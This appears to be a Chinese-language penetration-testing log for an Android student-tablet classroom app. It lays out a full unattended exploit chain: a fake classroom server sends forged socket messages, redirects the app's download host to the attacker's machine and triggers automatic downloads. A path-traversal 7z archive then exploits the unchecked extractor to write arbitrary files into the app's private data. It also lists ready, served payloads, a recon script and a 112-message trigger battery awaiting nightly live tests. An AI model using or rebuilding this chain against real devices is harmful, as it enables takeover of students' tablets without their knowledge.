# ★★★ 完整无人值守利用链（2026-10-07 02:20）

## 一、全链（每一步都有代码依据）

```
① 信封（决定性，本会话确证）
   ScanMessage 线上格式 = ServerMessage{ cmd / ct / from / gt / smsg / cId }
     smsg 是 SocketMessage **对象**；若为空则用 ct 字段的 JSON 字符串回退
   解析入口: HandleSocketMsgService.onHandleIntent:239-271
   心跳: 纯文本 "ping"/"pong"（:222-236）
   ⇒ 伪教室 fake_classroom.py 已按此下发（smsg 对象版 + ct 字符串版 + pong）

② 打开"从我们下载"的开关
   SocketMessage.type = 50001 (OPEN_FTP_CODE)
     StuFtpManager :pswitch_1 (:683-785)
       data = sm.getData() →  JSON: port / hostName / rootPath / downloadWaitTime / startLimitRate
       address = hostName + ":" + port;  rootPath 原样保存;  isOpenFtp = true
   ⇒ 之后端侧任何走 downloadFromTeacher 的下载，主机/前缀都是**我们**

③ 触发器：任务推送 → 自动下载
   SocketMessage(type=新任务/资源类) → TaskDetail → TaskDetailDaoHelper.insert
     StudentDeskTopPresenter:5856-5873  → AutoDownloadManager.isDownloading(getSourceId(task))
     AutoDownloadManager → ResourceDownloader → ResourceHelper.downLoadResource(:876)
       :981  StuFtpManager.downloadFromTeacher(savePath, "ztktv4_resource", url, ...)
   ⇒ **下载动作由任务消息驱动，无需用户点击**

④ 自动解压（关键漏洞）
   ResourceHelper.lambda$doHandDownLoadSuccess$0:1464
     ★ Z7Extractor.extractFile(档案, 目标目录, callback)
   com.hzy.lib7z.Z7Extractor (Java, :21-51)
     ★ 只做 prepareOutPath = mkdirs + isDirectory，**没有任何 ../ 校验**
     ★ System.loadLibrary("un7zip")  ⇒ libun7zip.so
   libun7zip.so (57KB, cls_dec/lib/armeabi-v7a/)
     ★ 导出 Java_com_hzy_lib7z_Z7Extractor_nExtractFile
     ★ 符号 SzArEx_Extract / OutFile_OpenUtf16 / MyCreateDir / fopen
     ★ 字符串中**没有** "../"、canonical、safe 之类防护
     ⇒ 即 LZMA SDK 的 7z 示例解压器：直接用档案内条目名拼输出路径

⑤ 任意写
   我们投递 payload_slip.7z（2720B，18 个条目，名字含 ../ 前缀，深度 3..8）
     → 解压时越出目标目录
     → 命中 /data/data/<学生包名>/shared_prefs/lab_marker.xml
       （以及 /sdcard/xuehai/lab_zipslip.txt 便于读回证明）
   ⇒ **任意文件写入**（可用于植入 shared_prefs / 配置，配合后续接管）
```

## 二、载荷现状（已生成、已验证、已挂服务）

```
pentest/payload_slip.7z    2720B  真 7z；18 条目；原始字节 "../"×45、反斜杠 0
pentest/payload_malicious.cwp 1422B  ZIP 变体（针对完整 7-Zip 的 CWP 流程）
pentest/payload.xml        170B   普通标记（对照/课堂链）
pentest/payload_webview.html 3198B WebView 探测页
pentest/survey_recon.js    6510B  浏览器侧全面侦察

HTTP 分发（fake_classroom.py，自测通过）
  /x.7z   → payload_slip.7z      (2720B, 7z=True)
  /y.cwp  → payload_malicious.cwp (1422B, zip=True)
  其它    → payload.xml           (170B)
```

## 三、触发链已追到"动作层"，并用消息矩阵覆盖最后的不确定性

```
已确证的本地广播动作（StudentDeskTopActivity.onMsgEvent :5543 起）:
  :5928  "action_socket_create_new_task"      -> recivieNewTask(TaskDetail)  :5946
  :5904  AutoDownloadManager.getSourceId(taskDetail) + isDownloading(...)    ← 自动下载判定
  :5971  "action_socket_download_ppt_resource" -> autoDownLoadRes(Object)    :5985
  :5951  "action_socket_task_revoke" / :5960 "action_socket_update_remarker" / :5990 "action_socket_send_phrase"

这些动作由 socket 消息驱动（dispatcher 解析后发 ContextMessage）:
  StudentDeskTopPresenter.callBackTaskDetail(TaskDetail) :2318  -> ContextMessage.sendMsg("action_socket_create_new_task", td)
  StudentDeskTopPresenter.autoDownLoadRes(Object) :1462  -> 强转 PptProgressBean（:1484）后走自动下载
  PptProgressBean 字段: deskTopId / resourceId / taskId / subTaskId / status / resourceType /
                        taskStatus / isSync / isAutoSyn / teaAreaHeight|Width / teaScaleSize / wordsGroupId
  TaskDetail 字段: taskId / subTaskId / taskType / itemType / pptSource / docHomeworkTaskVo / viewedIds ...

已枚举的分发器 switch 值（MessageHandleForWwzHelper.doHandleMsg）:
  sparse: 0x64..0x76, 0x258, 0x26a, 0x27a, 0x3ef, 0xfab..0xfb1, 0x96a28/29, 0x96e11/12
  packed: 0x12d(+9), 0x25c(+4), 0x276(+3), 0xbb9(+5), 0xbbf(+3), 0xfa1(+8)
  MessageHandleForServerHelper: 0x2711, 0x271a, 0x186a1, 0x1adb1, 0xfbb58, 0xfe268

★ 务实收口：**消息矩阵**（fake_classroom.push_battery）
  16 个候选类型 × 7 个候选载荷 = 112 条，全部按 ServerMessage{smsg} 信封下发：
    类型: 0x0(CREATE_NEW_TASK) 0x4(SYNC_PPT) 0x5(PPT_HAS_ENTRY) 0x64 0x68 0x69 0x75
          0x44E(SWITCH_PPT_TYPE) 0x12D 0x25C 0x276 0xBB9 0xBBF 0xFA1 0x2C7 0x2715
    载荷: TaskDetail JSON / PptProgressBean JSON / {url,fileUrl,downloadUrl,resourceUrl,path,sourceUrl}
          （全部指向 http://<内网IP>:8080/lab.7z）/ 数组包装 / {}
  ⇒ 端侧分发器会自行路由"它认得的那条" ⇒ 命中即可触发下载 ⇒ 我们返回 payload_slip.7z
  ⇒ 自测: 一次连接下发 112 条，写入 classroom_sent.txt
```

## 四、只剩"实机验证"

```
✅ 已确证：信封、50001 处理、下载指向我们、自动下载由任务/PPT推送驱动、解压器无路径校验（Java+原生双向确认）、
          恶意 7z 合法且条目名确为 ../ 形式、载荷已挂到 HTTP 服务、112 条触发候选已就绪
❓ 未确证：libun7zip.so 在设备上是否真的不拦 ../（本机无 ARM 环境）；112 条里哪条真正被端侧接受
⇒ 每晚等应用运行（夜禁解除）后，一次连接即可验证：
   看 classroom.log 的 [HTTP-GET from <内网IP>]（= 触发成功、端侧在下载我们的档案）
   再看 /sdcard/xuehai/lab_zipslip.txt 或 /data/data/<学生包名>/shared_prefs/lab_marker.xml 是否出现（= 任意写成功）
```

